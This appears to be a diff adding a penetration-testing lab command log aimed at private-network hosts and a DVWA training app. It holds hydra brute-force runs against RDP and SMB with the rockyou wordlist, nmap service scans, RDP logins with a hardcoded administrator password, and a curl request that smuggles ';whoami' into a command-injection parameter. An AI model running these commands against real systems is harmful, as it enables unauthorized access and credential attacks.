@@ -1,0 +1,51 @@
+ip route
+sudo ifconfig eth0 192.168.250.128 netmask 255.255.255.0 up
+sudo route add default gw 192.168.250.129 eth0
+
+hydra -L /usr/share/wordlists/metasploit/namelist.txt -p WrongPass123 192.168.254.140 rdp
+
+hydra -l esx -P /usr/share/wordlists/rockyou.txt smb://192.168.254.140
+
+hydra -l fakeuser -p "password123" rdp://192.168.254.140 
+
+nmap -Pn -sV 192.168.254.140
+
+nmap -Pn -sV -p 80 192.168.254.140
+
+nmap -Pn -sV 192.168.254.140
+
+curl "http://192.168.120.100/dvwa/vulnerabilities/exec/index.php?ip=127.0.0.1;whoami&Submit=Submit"
+
+
+curl -I http://192.168.120.100/dvwa/login.php 
+
+hydra -U administrator -p P@$$w0rd! 192.168.254.140 rdp
+
+xfreerdp /u:administrator /p:P@$$w0rd! /v:192.168.254.140 
+
+for i in {1..20}; do net rdp share -I 192.168.254.140 -U fakeuser%wrongpass; done
+
+for i in {1..20}; do net rpc share -I 192.168.254.140 -U fakeuser%wrongpass; done 
+
+xfreerdp /u:administrator /p:P@$$w0rd! /v:192.168.254.140 /dynamic-resolution
+
+hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.254.140
+
+nmap -Pn -sV -p 80 192.168.120.100 
+
+nmap -A 192.168.120.100
+
+nmap -sV -sC 192.168.120.100
+
+nmap -sV 192.168.120.100
+
+nmap -sV -p- 192.168.120.100
+
+nmap -sS -p 1-1000 -T4 192.168.250.129 
+
+nmap -A 192.168.250.129
+
+
+
+
+
